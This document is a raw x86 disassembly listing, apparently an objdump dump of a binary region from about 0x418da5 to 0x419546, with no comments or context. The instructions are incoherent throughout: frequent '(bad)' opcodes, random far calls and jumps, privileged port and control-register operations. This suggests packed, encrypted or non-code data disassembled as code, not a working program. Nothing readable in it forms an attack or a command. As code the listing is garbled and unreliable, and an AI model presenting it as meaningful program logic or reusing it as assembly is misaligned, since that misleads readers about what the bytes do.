  418da5:	out    0xdc,eax
  418da7:	mov    eax,0x314b295
  418dac:	sub    DWORD PTR [ecx],0xa
  418daf:	scas   al,BYTE PTR es:[edi]
  418db0:	aad    0x78
  418db2:	adc    eax,0x1335f0d2
  418db7:	jl     0x418dde
  418db9:	inc    DWORD PTR [eax]
  418dbb:	jp     0x418dbc
  418dbd:	mov    bl,0x33
  418dbf:	cld    
  418dc0:	mov    edx,0x3d600dd0
  418dc5:	dec    eax
  418dc6:	adc    BYTE PTR [ecx-0x44],0x85
  418dca:	stos   DWORD PTR es:[edi],eax
  418dcb:	add    al,0x74
  418dcd:	in     al,dx
  418dce:	xchg   ebx,eax
  418dcf:	fsub   st(1),st
  418dd1:	sbb    al,0xbe
  418dd3:	push   ebp
  418dd4:	push   esi
  418dd5:	push   esp
  418dd6:	push   edx
  418dd7:	div    dl
  418dd9:	xor    ch,al
  418ddb:	call   0xa60c:0x3785aa3a
  418de2:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418de4:	xchg   ebp,ebp
  418de6:	std    
  418de7:	(bad)  
  418de9:	lds    edx,FWORD PTR [edi+ecx*8+0x1d]
  418ded:	dec    eax
  418dee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418def:	in     al,dx
  418df0:	fsubr  QWORD PTR [ebp+eax*4+0x1e]
  418df4:	(bad)  [edx-0x6c47ecff]
  418dfa:	repz cmp DWORD PTR [esi],0x4c440c20
  418e01:	(bad)  
  418e03:	int3   
  418e04:	or     BYTE PTR [eax-0x19],al
  418e07:	sbb    BYTE PTR [esi+0x11],0x5a
  418e0b:	jbe    0x418e3a
  418e0d:	adc    ecx,ebx
  418e0f:	in     al,dx
  418e10:	xchg   edi,eax
  418e11:	inc    esi
  418e12:	mov    ds:0x9f05fc35,al
  418e17:	push   cs
  418e18:	mov    dh,0xfe
  418e1a:	leave  
  418e1b:	scas   al,BYTE PTR es:[edi]
  418e1c:	sbb    BYTE PTR [edx+edx*2-0x3fc655ec],bl
  418e23:	xchg   edx,eax
  418e24:	mov    bl,0x3
  418e26:	xchg   edi,eax
  418e27:	cwde   
  418e28:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418e29:	mov    cl,al
  418e2b:	ret    
  418e2c:	mov    ss,WORD PTR [edi-0x1f]
  418e2f:	jmp    FWORD PTR [ebp+ebp*4+0x17fed335]
  418e36:	and    BYTE PTR [ebx],dh
  418e38:	jb     0x418dd4
  418e3a:	fidivr WORD PTR [edi+0x5793296b]
  418e40:	les    ecx,FWORD PTR [eax+0xe]
  418e43:	sub    DWORD PTR [edi-0x58],edi
  418e46:	mov    eax,0xdce10f6e
  418e4b:	lea    edi,[edi+0x9323157]
  418e51:	jo     0x418e58
  418e53:	ret    0x69d1
  418e56:	dec    esi
  418e57:	outs   dx,DWORD PTR ds:[esi]
  418e58:	ss out 0xae,eax
  418e5b:	sahf   
  418e5c:	cld    
  418e5d:	inc    edi
  418e5e:	pushf  
  418e5f:	lods   al,BYTE PTR ds:[esi]
  418e60:	inc    esi
  418e61:	pop    esp
  418e62:	push   ds
  418e63:	inc    edx
  418e64:	sbb    eax,0x6596123b
  418e69:	fiadd  WORD PTR [ebx+0x28]
  418e6c:	sahf   
  418e6d:	into   
  418e6e:	(bad)  
  418e6f:	cmc    
  418e70:	cs icebp 
  418e72:	lock ror DWORD PTR [esp+eax*4-0x7e1efbd],1
  418e7a:	adc    al,0x3
  418e7c:	sub    eax,DWORD PTR [esi-0x17de4875]
  418e82:	adc    BYTE PTR [esi],bh
  418e84:	jne    0x418f05
  418e86:	es popa 
  418e88:	sub    edx,DWORD PTR [edx-0x69]
  418e8b:	daa    
  418e8c:	std    
  418e8d:	sub    al,0xf2
  418e8f:	aas    
  418e90:	nop
  418e91:	loope  0x418edc
  418e93:	inc    ecx
  418e94:	rol    BYTE PTR [eax-0x12],cl
  418e97:	mov    edx,0x3e900363
  418e9c:	sub    cl,cl
  418e9e:	mov    gs,WORD PTR [ebp+0x65]
  418ea1:	jl     0x418eb9
  418ea3:	push   ebp
  418ea4:	inc    eax
  418ea5:	xchg   edi,eax
  418ea6:	adc    eax,0xcfd42e78
  418eab:	sbb    eax,0xb9658cba
  418eb0:	(bad)  
  418eb1:	and    ebx,eax
  418eb3:	in     eax,0x73
  418eb5:	dec    esi
  418eb6:	sub    BYTE PTR [ebx],al
  418eb8:	cmp    dh,BYTE PTR [ebp+0x16df0411]
  418ebe:	xchg   ecx,eax
  418ebf:	mov    dl,0x52
  418ec1:	jle    0x418e90
  418ec3:	xlat   BYTE PTR ds:[ebx]
  418ec4:	in     al,dx
  418ec5:	pop    esi
  418ec6:	pop    ecx
  418ec7:	xchg   ebp,eax
  418ec8:	xor    BYTE PTR [ebx-0x72],al
  418ecb:	and    cl,BYTE PTR [ebx]
  418ecd:	unpckhps xmm3,XMMWORD PTR [eax-0x23]
  418ed1:	cmp    esi,edx
  418ed3:	fwait
  418ed4:	jg     0x418f40
  418ed6:	xor    dh,BYTE PTR [edi]
  418ed8:	(bad)  
  418ed9:	sbb    eax,0x3831e23b
  418ede:	adc    eax,0xe52fb49d
  418ee3:	xor    al,BYTE PTR [esi]
  418ee5:	sti    
  418ee6:	pop    edx
  418ee7:	mov    ?,ebx
  418ee9:	sub    DWORD PTR [edx+0x43],ebx
  418eec:	mov    esp,0x318ee3e5
  418ef1:	stc    
  418ef2:	(bad)  
  418ef3:	cmp    cl,BYTE PTR [ebx+0x6f]
  418ef6:	lods   eax,DWORD PTR ds:[esi]
  418ef7:	push   esp
  418ef8:	lods   al,BYTE PTR ds:[esi]
  418ef9:	jb     0x418e97
  418efb:	adc    eax,0x6bae579f
  418f00:	in     eax,dx
  418f01:	mov    fs,ebp
  418f03:	mov    eax,ds:0x4662b896
  418f08:	push   edx
  418f09:	inc    ecx
  418f0a:	fild   QWORD PTR [esi]
  418f0c:	push   ds
  418f0d:	sub    eax,DWORD PTR [edx+0x34]
  418f10:	jae    0x418f7a
  418f12:	fldcw  WORD PTR [edx-0xa5a60f3]
  418f18:	aad    0xd1
  418f1a:	mov    ebp,0x8d71a297
  418f1f:	dec    ebp
  418f20:	pop    ebx
  418f21:	(bad)  [ebp-0x2c]
  418f24:	dec    edx
  418f25:	push   0x10
  418f27:	jmp    0x418ee8
  418f29:	hlt    
  418f2a:	dec    esp
  418f2b:	test   ah,0x75
  418f2e:	(bad)
  418f32:	fwait
  418f33:	jno    0x418f7f
  418f35:	cdq    
  418f36:	sti    
  418f37:	jne    0x418f0e
  418f39:	test   eax,0x8dba6cc2
  418f3e:	mov    esp,0x21460fc2
  418f43:	mov    cr4,esp
  418f46:	push   edx
  418f47:	jo     0x418ed9
  418f49:	out    0x47,al
  418f4b:	gs mov eax,0xe0833c76
  418f51:	popa   
  418f52:	outs   dx,DWORD PTR ds:[esi]
  418f53:	and    al,0x3b
  418f55:	idiv   BYTE PTR [edi+0x51a2a587]
  418f5b:	je     0x418f4e
  418f5d:	jp     0x418f1f
  418f5f:	add    eax,0x11f5cf0a
  418f64:	fnstcw WORD PTR [ebx-0x6b1ab812]
  418f6a:	sbb    esp,DWORD PTR [ecx-0xd6702cb]
  418f70:	and    DWORD PTR [esi+0x632d47b5],ebx
  418f76:	jle    0x418f4d
  418f78:	adc    al,0x64
  418f7a:	dec    eax
  418f7b:	sbb    DWORD PTR ds:0x45aa698d,ecx
  418f81:	jnp    0x418fe1
  418f83:	ja     0x418f2c
  418f85:	lea    eax,[eax+0x31]
  418f88:	imul   DWORD PTR [ebx]
  418f8a:	jnp    0x418fab
  418f8c:	dec    esi
  418f8d:	inc    edx
  418f8e:	xor    cl,BYTE PTR [edx]
  418f90:	fld    DWORD PTR [ebp+0xc422149]
  418f96:	test   eax,0x99c310ea
  418f9b:	shl    BYTE PTR [ecx],cl
  418f9d:	push   edi
  418f9e:	jle    0x419013
  418fa0:	and    al,0x98
  418fa2:	dec    edx
  418fa3:	imul   ebx,DWORD PTR [edi-0x2b8950c],0x77
  418faa:	and    bl,BYTE PTR [ebp-0x32b327fc]
  418fb0:	push   cs
  418fb1:	test   BYTE PTR [edi+0x43],0xc1
  418fb5:	shl    DWORD PTR [ebp+0x10],1
  418fb8:	int    0x21
  418fba:	xchg   ebp,eax
  418fbb:	je     0x418fa2
  418fbd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418fbe:	das    
  418fbf:	and    BYTE PTR [ebx-0x4],al
  418fc2:	test   al,0x77
  418fc4:	mov    al,0xfb
  418fc6:	inc    esi
  418fc7:	(bad)  
  418fc8:	cmp    eax,0x76ca5161
  418fcd:	test   BYTE PTR [ecx],cl
  418fcf:	jne    0x418f6b
  418fd1:	loop   0x418f68
  418fd3:	adc    ah,ah
  418fd5:	test   DWORD PTR [ecx],edi
  418fd7:	push   ebp
  418fd8:	fdiv   QWORD PTR [edx]
  418fda:	scas   eax,DWORD PTR es:[edi]
  418fdb:	and    cl,0x44
  418fde:	push   ss
  418fdf:	pop    edx
  418fe0:	pop    edi
  418fe1:	push   0x0
  418fe3:	push   ecx
  418fe4:	sti    
  418fe5:	xchg   ecx,eax
  418fe6:	enter  0xd676,0xe4
  418fea:	mov    cl,0x5c
  418fec:	das    
  418fed:	xor    al,cl
  418fef:	sar    DWORD PTR [esi+0x7962766d],0x48
  418ff6:	call   0xc527:0xa04582d1
  418ffd:	sbb    al,0xf1
  418fff:	push   0x20a8d36f
  419004:	xor    bl,BYTE PTR [ebx-0x13]
  419007:	xchg   esp,eax
  419008:	inc    ebp
  419009:	push   edx
  41900a:	fnstsw WORD PTR [ebx+0x8]
  41900d:	cmp    bh,BYTE PTR [ecx+0x3e448b3d]
  419013:	sahf   
  419014:	test   BYTE PTR [edx-0x6aa960d4],cl
  41901a:	pop    ds
  41901b:	mov    ds:0xa243ad52,al
  419020:	pop    edx
  419021:	mov    al,ds:0x5071397b
  419026:	lods   eax,DWORD PTR ds:[esi]
  419027:	dec    edi
  419028:	shl    BYTE PTR [esi+0x741ee24c],0x79
  41902f:	push   edx
  419030:	pop    eax
  419031:	ficomp WORD PTR [edx]
  419033:	arpl   WORD PTR [edx-0x1],dx
  419036:	pushf  
  419037:	aam    0x7f
  419039:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41903a:	inc    ecx
  41903b:	xchg   ecx,eax
  41903c:	mov    edx,0x761d0027
  419041:	pop    eax
  419042:	push   esp
  419043:	fwait
  419044:	stos   BYTE PTR es:[edi],al
  419045:	mov    BYTE PTR [ebp-0x12],dh
  419048:	retf   0xd0c9
  41904b:	not    DWORD PTR [edx-0x65696958]
  419051:	gs ror eax,1
  419054:	dec    eax
  419055:	add    dh,BYTE PTR [ebp+0x2f]
  419058:	cmp    DWORD PTR [ebx+0x77],0x20d5c2aa
  41905f:	loop   0x4190d1
  419061:	adc    ecx,DWORD PTR [ebx]
  419063:	es push edx
  419065:	rol    BYTE PTR [eax],1
  419067:	xchg   ebp,eax
  419068:	(bad)  
  419069:	aaa    
  41906a:	iret   
  41906b:	xchg   edx,eax
  41906c:	mov    ds,WORD PTR [ebx]
  41906e:	jne    0x419020
  419070:	in     al,dx
  419071:	cmc    
  419072:	pop    ecx
  419073:	sbb    BYTE PTR [edx],al
  419075:	mov    dl,0x37
  419077:	jae    0x41902e
  419079:	mov    ?,WORD PTR [edx+ebx*8+0x4a96e91a]
  419080:	xchg   ebp,eax
  419081:	cmc    
  419082:	add    al,0x87
  419084:	jg     0x419100
  419086:	shl    BYTE PTR [edx],1
  419088:	pop    esi
  419089:	inc    ebx
  41908a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41908b:	inc    eax
  41908c:	inc    edx
  41908d:	inc    edx
  41908e:	rcl    DWORD PTR ds:0xb40d70a5,0x9
  419095:	das    
  419096:	sbb    edx,edx
  419098:	out    dx,al
  419099:	inc    ebp
  41909a:	imul   edx,DWORD PTR [edi],0xc
  41909d:	push   edx
  41909e:	aad    0xb9
  4190a0:	xchg   BYTE PTR [edi],dh
  4190a2:	ss mov ecx,0x4cd9e7b1
  4190a8:	xor    bl,BYTE PTR [edi+0x6]
  4190ab:	test   BYTE PTR [ebx+0x3a],bl
  4190ae:	aas    
  4190af:	sar    DWORD PTR cs:[edx+0x658d9e7f],cl
  4190b6:	pop    ecx
  4190b7:	pop    es
  4190b8:	cmp    cl,BYTE PTR [edi]
  4190ba:	int3   
  4190bb:	pop    edx
  4190bc:	ins    BYTE PTR es:[edi],dx
  4190bd:	jmp    0x41909c
  4190bf:	and    al,0x9f
  4190c1:	sbb    ebp,ecx
  4190c3:	mov    cl,0x48
  4190c5:	mov    al,0xb3
  4190c7:	push   es
  4190c8:	cwde   
  4190c9:	mov    ebp,0x1af13636
  4190ce:	aaa    
  4190cf:	sub    eax,0xf8379333
  4190d4:	or     BYTE PTR [ecx+0x2a],bh
  4190d7:	jg     0x419147
  4190d9:	xor    DWORD PTR [edi-0x79409ab0],eax
  4190df:	xchg   edi,eax
  4190e0:	sbb    BYTE PTR [edi+0x53aeac9c],0x1
  4190e7:	ja     0x419164
  4190e9:	sub    eax,0xb551ac0c
  4190ee:	adc    dl,ah
  4190f0:	(bad)  
  4190f2:	add    eax,edx
  4190f4:	push   ss
  4190f5:	pop    edx
  4190f6:	cmp    al,0xe2
  4190f8:	ret    
  4190f9:	retf   
  4190fa:	sub    eax,0xb9884405
  4190ff:	pop    DWORD PTR ds:0x86d55bf3
  419105:	sbb    eax,DWORD PTR [ebp+esi*8+0x79e5d77]
  41910c:	clc    
  41910d:	jg     0x4190c1
  41910f:	push   ebp
  419110:	inc    ecx
  419111:	fwait
  419112:	or     DWORD PTR [ebx+edi*4+0x5e222c5b],ebp
  419119:	fild   QWORD PTR [edx]
  41911c:	pop    ebx
  41911d:	pop    ebx
  41911e:	sti    
  41911f:	in     al,0xcd
  419121:	adc    BYTE PTR [edx],ch
  419123:	or     cl,ah
  419125:	or     DWORD PTR [esi],edx
  419127:	and    al,0xf7
  419129:	push   eax
  41912a:	adc    bh,bl
  41912c:	adc    dh,ch
  41912e:	loop   0x41910a
  419130:	enter  0x8abc,0xf1
  419134:	or     al,0x26
  419136:	rcl    BYTE PTR [ebp-0x65e14664],0xd9
  41913d:	rcr    bl,cl
  41913f:	xchg   esi,eax
  419140:	push   eax
  419141:	(bad)  
  419142:	cmp    al,0x81
  419144:	inc    edx
  419145:	jge    0x419116
  419147:	imul   ebp,DWORD PTR [esi-0x2f],0x6cc75fcd
  41914e:	lock adc esp,ecx
  419151:	lock xor eax,0xc958d87a
  419157:	call   0x56df62c9
  41915c:	out    0xe2,al
  41915e:	pop    ebx
  41915f:	scas   al,BYTE PTR es:[edi]
  419160:	sbb    DWORD PTR [ecx],edi
  419162:	push   ss
  419163:	pop    ebx
  419164:	fldcw  WORD PTR [eax]
  419166:	out    dx,eax
  419167:	mov    eax,0xa7db8d4e
  41916c:	mov    bl,0x31
  41916e:	retf   
  41916f:	scas   al,BYTE PTR es:[edi]
  419170:	pop    ss
  419171:	jp     0x419174
  419173:	cmovno edx,ebx
  419176:	scas   eax,DWORD PTR es:[edi]
  419177:	clc    
  419178:	sbb    al,BYTE PTR [ebx+0x1d1bf27b]
  41917e:	ins    BYTE PTR es:[edi],dx
  41917f:	xchg   edx,eax
  419180:	mov    bl,0x8a
  419182:	pop    edi
  419183:	sub    DWORD PTR [edi+0x9],esi
  419186:	(bad)
  41918a:	inc    esi
  41918b:	or     ch,BYTE PTR [ebx+0x51570456]
  419191:	mov    ah,0x5e
  419193:	inc    edx
  419194:	repz and DWORD PTR [ecx],esp
  419197:	fs xchg ecx,eax
  419199:	xchg   esp,eax
  41919a:	or     DWORD PTR [eax-0x7f],ebp
  41919d:	sahf   
  41919e:	xchg   al,dl
  4191a0:	xchg   ebp,eax
  4191a1:	push   ss
  4191a2:	adc    cl,BYTE PTR [edx]
  4191a4:	mov    dl,0xbe
  4191a6:	pop    DWORD PTR [esi-0x50c41526]
  4191ac:	push   ebx
  4191ad:	dec    esp
  4191ae:	sub    eax,0x82bdfa21
  4191b3:	jbe    0x419199
  4191b5:	inc    ebx
  4191b6:	sbb    BYTE PTR [eax],dl
  4191b8:	bound  edx,QWORD PTR [eax]
  4191ba:	or     cl,al
  4191bc:	repz aaa 
  4191be:	jmp    0xf83cf891
  4191c3:	stos   BYTE PTR es:[edi],al
  4191c4:	nop
  4191c5:	lods   eax,DWORD PTR ds:[esi]
  4191c6:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  4191c8:	int    0x2b
  4191ca:	fbstp  TBYTE PTR [edx+0x3a4228a6]
  4191d0:	pop    eax
  4191d1:	add    DWORD PTR [ebx+0x1ec53257],edx
  4191d7:	in     al,0x33
  4191d9:	cmp    al,ch
  4191db:	xor    dl,bh
  4191dd:	mov    ch,0xc2
  4191df:	adc    cl,BYTE PTR [esi]
  4191e1:	addr16 jnp 0x4191a8
  4191e4:	push   ecx
  4191e5:	hlt    
  4191e6:	jg     0x419234
  4191e8:	pop    edi
  4191e9:	out    0x16,al
  4191eb:	lods   al,BYTE PTR ds:[esi]
  4191ec:	push   ebp
  4191ed:	out    0x7f,eax
  4191ef:	fidivr DWORD PTR [eax]
  4191f1:	dec    ebp
  4191f2:	push   cs
  4191f3:	mov    DWORD PTR cs:[edx+0x12],0xffb3d285
  4191fb:	sub    BYTE PTR [edi+ebx*8-0x1b],cl
  4191ff:	xchg   esi,eax
  419200:	fsub   st,st(7)
  419202:	(bad)  
  419203:	inc    eax
  419204:	pop    ds
  419205:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419206:	pop    esi
  419207:	loopne 0x41918f
  419209:	imul   eax,DWORD PTR [edi],0xffffff83
  41920c:	pop    edi
  41920d:	retf   0x6764
  419210:	and    cl,BYTE PTR [edx-0x25d8c28f]
  419216:	sub    eax,0xe7a2543e
  41921b:	ret    0x6c8c
  41921e:	std    
  41921f:	jbe    0x4191e5
  419221:	outs   dx,BYTE PTR ds:[esi]
  419222:	jnp    0x4191e4
  419224:	cmp    al,BYTE PTR [eax+0x48bb6217]
  41922a:	ror    esp,0x51
  41922d:	ret    0xbe7a
  419230:	fwait
  419231:	mov    dl,0xbf
  419233:	jns    0x419243
  419235:	pop    ds
  419236:	xchg   BYTE PTR [esi-0x2cc62bec],bl
  41923c:	jp     0x4191ec
  41923e:	pop    ds
  41923f:	push   ebx
  419240:	and    esi,DWORD PTR [esi+0x4a]
  419243:	xchg   BYTE PTR [eax-0x41],dh
  419246:	push   esp
  419247:	mov    al,0xbb
  419249:	dec    ebx
  41924a:	mov    ebp,0x1d3362a4
  41924f:	scas   eax,DWORD PTR es:[edi]
  419250:	out    0x7a,eax
  419252:	mov    cl,0x2c
  419254:	enter  0x2bf5,0x6a
  419258:	jo     0x4192cb
  41925a:	das    
  41925b:	cmc    
  41925c:	push   0xffffffe4
  41925e:	fsub   QWORD PTR [ecx+0x75]
  419261:	ror    DWORD PTR [edi-0x1e20087f],0x88
  419268:	jg     0x419262
  41926a:	fmul   QWORD PTR [esi]
  41926c:	ss add edi,0x58
  419270:	cdq    
  419271:	mov    ds:0x544823d0,al
  419276:	sbb    BYTE PTR [edx-0x6fb2182e],dl
  41927c:	or     BYTE PTR [ecx+0x37],dl
  41927f:	push   ebp
  419280:	and    BYTE PTR [eax],ch
  419282:	push   ss
  419283:	repz inc eax
  419285:	fbstp  TBYTE PTR [esi+0x2a]
  419288:	stc    
  419289:	enter  0xaa4c,0x51
  41928d:	adc    BYTE PTR [edi+0x67696b7],dh
  419293:	je     0x419245
  419295:	add    bl,BYTE PTR [ecx]
  419297:	fist   DWORD PTR [edx+0x2b]
  41929a:	add    ebp,DWORD PTR [edi-0xd]
  41929d:	jns    0x419290
  41929f:	mov    al,0xc2
  4192a1:	xchg   esi,eax
  4192a2:	mov    cl,0x28
  4192a4:	rol    BYTE PTR [eax],1
  4192a6:	push   eax
  4192a7:	mov    edi,0x4e0c115e
  4192ac:	mov    eax,ds:0x1ba1b30a
  4192b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4192b2:	daa    
  4192b3:	lock fistp DWORD PTR [edx-0x7c]
  4192b7:	daa    
  4192b8:	push   cs
  4192b9:	jmp    0xf434:0xc10734c9
  4192c0:	fcos   
  4192c3:	aad    0xe2
  4192c5:	mov    esp,0xac538183
  4192ca:	outs   dx,BYTE PTR ds:[esi]
  4192cb:	adc    edx,DWORD PTR [ecx-0x53c5c7a3]
  4192d1:	jmp    0x73e1b802
  4192d6:	sub    ah,BYTE PTR [ecx-0x8]
  4192d9:	outs   dx,DWORD PTR ds:[esi]
  4192da:	out    0x1f,al
  4192dc:	dec    edx
  4192dd:	jae    0x419357
  4192df:	mov    DWORD PTR [eax+esi*8-0x708e6aba],eax
  4192e6:	ret    0x9107
  4192e9:	frstor ds:0xa5af85f6
  4192ef:	push   0x24c44b87
  4192f4:	(bad)  
  4192f5:	neg    BYTE PTR [edx-0x1a0e4aee]
  4192fb:	test   BYTE PTR [eax-0x6],ah
  4192fe:	daa    
  4192ff:	add    DWORD PTR [ebp+0x15],esp
  419302:	leave  
  419303:	push   ebx
  419304:	and    al,0xbe
  419306:	repz shr DWORD PTR [edi+0x55],cl
  41930a:	mov    esp,0x1fd4e123
  41930f:	clc    
  419310:	pop    ebp
  419311:	loop   0x4192d9
  419313:	push   edi
  419314:	mov    ds:0xca00819d,al
  419319:	enter  0x7ca8,0x67
  41931d:	or     DWORD PTR [eax-0xf],0xf5b53134
  419324:	cmp    BYTE PTR [esi-0x66b1dcb6],bh
  41932a:	ja     0x41939e
  41932c:	or     cl,0xaf
  41932f:	or     dl,dl
  419331:	sar    BYTE PTR [edi+eax*2-0x269fe1c0],cl
  419338:	xchg   ch,ch
  41933a:	and    eax,0x1101403f
  41933f:	mov    dl,0xb5
  419341:	add    dh,BYTE PTR [eax-0x7c]
  419344:	ins    DWORD PTR es:[edi],dx
  419345:	in     al,0xfb
  419347:	add    DWORD PTR [eax+0x3c],eax
  41934a:	in     eax,0x51
  41934c:	loop   0x419334
  41934e:	fwait
  41934f:	cmp    DWORD PTR [edi+edx*4],ecx
  419352:	or     ecx,0x4f9a2a57
  419358:	leave  
  419359:	or     bl,BYTE PTR [esp+ebx*2-0x54]
  41935d:	hlt    
  41935e:	xor    dh,0x28
  419361:	loop   0x41933d
  419363:	ds pop edi
  419365:	sub    BYTE PTR [edi-0x55],al
  419368:	mov    edi,0xb9d317ad
  41936d:	cli    
  41936e:	adc    ah,BYTE PTR [edi+0x42]
  419371:	les    esi,FWORD PTR ds:0x77b5643b
  419377:	dec    esi
  419378:	push   DWORD PTR [ecx+eax*1+0x5d5df257]
  41937f:	out    dx,al
  419380:	add    esi,esp
  419382:	and    BYTE PTR [ecx+0x6b8ef4bd],al
  419388:	lods   eax,DWORD PTR ds:[esi]
  419389:	cdq    
  41938a:	ja     0x419397
  41938c:	or     eax,0xafe575ae
  419391:	in     al,0x6f
  419393:	push   esi
  419394:	mov    edx,0xb1c5537d
  419399:	je     0x4193c4
  41939b:	ins    DWORD PTR es:[edi],dx
  41939c:	xchg   ebx,eax
  41939d:	out    0x4b,eax
  41939f:	or     DWORD PTR [ebx],ecx
  4193a1:	push   eax
  4193a2:	sub    ebx,ebx
  4193a4:	pop    eax
  4193a5:	popf   
  4193a6:	and    DWORD PTR [ebx+0x7e20f99c],ebx
  4193ac:	xchg   ah,ch
  4193ae:	xchg   ebx,eax
  4193af:	jge    0x419370
  4193b1:	je     0x41933a
  4193b3:	out    0x4,eax
  4193b5:	mov    bl,0x79
  4193b7:	xchg   edi,eax
  4193b8:	mov    al,0x16
  4193ba:	pop    ds
  4193bb:	outs   dx,DWORD PTR ds:[esi]
  4193bc:	push   ss
  4193bd:	ja     0x4193a7
  4193bf:	outs   dx,DWORD PTR ds:[esi]
  4193c0:	pop    ss
  4193c1:	xor    BYTE PTR [edx+ecx*4+0x725b81fd],cl
  4193c8:	(bad)  
  4193c9:	jg     0x419387
  4193cb:	add    al,0x4b
  4193cd:	lods   al,BYTE PTR ds:[esi]
  4193ce:	cmc    
  4193cf:	adc    edx,esi
  4193d1:	pop    edi
  4193d2:	jecxz  0x4193f8
  4193d4:	lods   al,BYTE PTR ds:[esi]
  4193d5:	int    0x18
  4193d7:	push   es
  4193d8:	loop   0x41937d
  4193da:	mov    edx,0xa9be7f6a
  4193df:	lods   eax,DWORD PTR ds:[esi]
  4193e0:	imul   esi,DWORD PTR [ecx-0x3f],0x7d
  4193e4:	repnz sub ebp,DWORD PTR [ecx]
  4193e7:	retf   0x730f
  4193ea:	inc    edx
  4193eb:	je     0x41942d
  4193ed:	cmc    
  4193ee:	mov    ch,0x4d
  4193f0:	pop    eax
  4193f1:	xor    edx,esp
  4193f3:	adc    DWORD PTR [edx+0x535a8fb3],ebx
  4193f9:	push   cs
  4193fa:	ret    
  4193fb:	and    ecx,DWORD PTR [edx-0x5ddeb06d]
  419401:	call   0x78da97d7
  419406:	scas   eax,DWORD PTR es:[edi]
  419407:	add    BYTE PTR [ebx-0x79],ch
  41940a:	fld    QWORD PTR [edx]
  41940c:	sti    
  41940d:	pop    es
  41940e:	mov    al,0xff
  419410:	repz lea ebp,[esi+0x42]
  419414:	imul   ebp,DWORD PTR [esi],0xfffffffb
  419417:	aam    0x1c
  419419:	cmp    BYTE PTR [ebp+0x1],0xb9
  41941d:	or     bh,BYTE PTR [ecx]
  41941f:	mov    WORD PTR [ecx],gs
  419421:	cmp    dh,BYTE PTR [edx]
  419423:	jmp    0x3614:0x5e232be9
  41942a:	dec    edx
  41942b:	mov    edi,0xedd0f4c3
  419430:	sar    BYTE PTR [edx-0x553e507d],cl
  419436:	add    DWORD PTR ds:0xc8e6ca56,esp
  41943c:	retf   0x6742
  41943f:	ret    0x52ec
  419442:	sub    eax,0x3348c5e3
  419447:	outs   dx,DWORD PTR ds:[esi]
  419448:	xchg   ecx,eax
  419449:	std    
  41944a:	push   es
  41944b:	jp     0x4194bc
  41944d:	xchg   BYTE PTR [esi],bl
  41944f:	adc    al,0xdb
  419451:	call   0xe8d61532
  419456:	inc    ebp
  419457:	adc    esp,esp
  419459:	call   0x48d1:0x7ff8a4d0
  419460:	dec    eax
  419461:	rcr    BYTE PTR [eax-0x8b10cec],cl
  419467:	stc    
  419468:	mov    esp,0x551dd75f
  41946d:	or     esp,0xffffffee
  419470:	scas   al,BYTE PTR es:[edi]
  419471:	inc    edx
  419472:	fs ret 0x55b0
  419476:	add    ebx,DWORD PTR [ebp+0x4465c218]
  41947c:	aaa    
  41947d:	cld    
  41947e:	add    ah,ch
  419480:	xchg   BYTE PTR [ebp+0x7308abf9],bh
  419486:	call   DWORD PTR ds:0xb569b5e9
  41948c:	inc    ebp
  41948d:	sub    DWORD PTR [edx],edx
  41948f:	mov    esi,DWORD PTR [ecx-0x53]
  419492:	pop    esp
  419493:	sbb    BYTE PTR [ecx],ah
  419495:	outs   dx,BYTE PTR ds:[esi]
  419496:	out    dx,al
  419497:	and    edi,esi
  419499:	mov    ah,0x55
  41949b:	rol    BYTE PTR [esi-0x314cbef3],1
  4194a1:	sub    eax,0x702cc8a
  4194a6:	mov    dh,0xd
  4194a8:	sahf   
  4194a9:	pop    es
  4194aa:	popf   
  4194ab:	and    ebx,DWORD PTR [ebp+0x21fb8736]
  4194b1:	fcom   QWORD PTR [edx+0x27a5a370]
  4194b7:	mov    eax,ds:0xc27586a
  4194bc:	xor    al,0x65
  4194be:	icebp  
  4194bf:	xor    BYTE PTR [ebx-0x20],dl
  4194c2:	pop    ecx
  4194c3:	push   0x49
  4194c5:	mov    al,ds:0x6387e8df
  4194ca:	rcl    BYTE PTR [ebx+0x66],1
  4194cd:	or     ebp,esp
  4194cf:	xor    BYTE PTR [ebp+0x6f],0x77
  4194d3:	fiadd  DWORD PTR [esp+edi*4-0x7b20dcd]
  4194da:	mov    al,ds:0x7d49cbc7
  4194df:	outs   dx,BYTE PTR ds:[esi]
  4194e0:	add    eax,0x22f6b5b6
  4194e5:	(bad)  
  4194e7:	push   ebx
  4194e8:	pop    ss
  4194e9:	add    al,0x6
  4194eb:	(bad)  
  4194ec:	and    BYTE PTR [ebx-0x53],dh
  4194ef:	mov    dl,0xe
  4194f1:	outs   dx,BYTE PTR ds:[esi]
  4194f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4194f3:	jmp    DWORD PTR [esi]
  4194f5:	cmp    al,0x4
  4194f7:	lea    esp,[eax+edx*1+0x75]
  4194fb:	mov    ?,ecx
  4194fd:	or     eax,0xeee7f1c7
  419502:	(bad)  
  419503:	mov    BYTE PTR [edi-0x39],al
  419506:	mov    esi,0xd2453853
  41950b:	mov    cl,0xb2
  41950d:	pop    ds
  41950e:	jecxz  0x419530
  419510:	jle    0x41955e
  419512:	sub    edi,DWORD PTR [edx+0x6b60aece]
  419518:	or     BYTE PTR [edx],0x64
  41951b:	xor    BYTE PTR [esi+esi*8+0x5919788],cl
  419522:	pop    ds
  419523:	mov    ch,bh
  419525:	jo     0x4194ad
  419527:	hlt    
  419528:	push   edi
  419529:	add    esp,ebp
  41952b:	(bad)  
  41952c:	ins    BYTE PTR es:[edi],dx
  41952d:	fisubr DWORD PTR [esi+0x4a]
  419530:	cwde   
  419531:	xor    al,0x5c
  419533:	xchg   ecx,eax
  419534:	stos   DWORD PTR es:[edi],eax
  419535:	add    al,0x37
  419537:	test   al,0x4e
  419539:	ja     0x419522
  41953b:	xchg   esi,eax
  41953c:	jl     0x41950a
  41953e:	xchg   esi,eax
  41953f:	push   edx
  419540:	sbb    ecx,DWORD PTR [esi+0x22]
  419543:	adc    dh,BYTE PTR [ecx-0x42]
  419546:	mov    edi,0xaa67a3dd
